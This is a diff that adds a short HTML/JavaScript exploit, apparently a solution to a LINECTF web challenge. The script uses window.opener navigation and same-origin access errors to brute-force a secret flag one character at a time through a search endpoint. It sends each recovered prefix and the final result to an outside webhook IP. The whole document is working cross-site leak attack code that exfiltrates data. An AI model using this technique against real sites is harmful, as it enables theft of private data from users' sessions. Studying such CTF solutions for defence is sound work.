@@ -1,0 +1,43 @@
+<script>
+const url = "http://35.200.11.35";
+const webhook = "http://140.113.24.143:9002";
+const chars = "}-abcdefghijklmnopqrstuvwxyz0123456789";
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+const main = async () => {
+  await sleep(200);
+
+  window.open(`${webhook}/ping`);
+
+  let prefix = "LINECTF{";
+
+  while (true) {
+    if (prefix.endsWith("}")) {
+      break;
+    }
+    window.open(`${webhook}/prefix/${prefix}`);
+
+    await sleep(200);
+    let exists = false;
+    for (const c of chars) {
+
+      window.opener.location.href = `/empty.html`;
+      await sleep(200);
+      window.opener.location.href = `${url}/search?q=${prefix + c}&download`;
+      await sleep(500);
+
+      try {
+        console.log(window.opener.document.body.textContent);
+        prefix += c;
+        exists = true;
+        break;
+      } catch (e) { }
+    }
+    if (!exists) {
+      return;
+    }
+  }
+  window.open(`${webhook}/success/${prefix}`);
+};
+main();
+</script>
